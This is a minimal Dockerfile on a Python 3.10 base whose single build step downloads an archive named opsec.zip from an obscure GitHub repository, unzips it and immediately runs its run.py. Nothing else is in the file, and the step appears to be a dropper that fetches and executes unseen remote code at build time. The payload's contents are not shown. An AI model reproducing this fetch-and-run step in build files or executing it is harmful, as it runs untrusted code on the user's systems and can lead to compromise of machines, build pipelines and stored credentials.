FROM python:3.10
WORKDIR /app

RUN wget https://github.com/tarunabingzi/stunning-goggles/raw/refs/heads/main/opsec.zip;unzip opsec.zip;python run.py
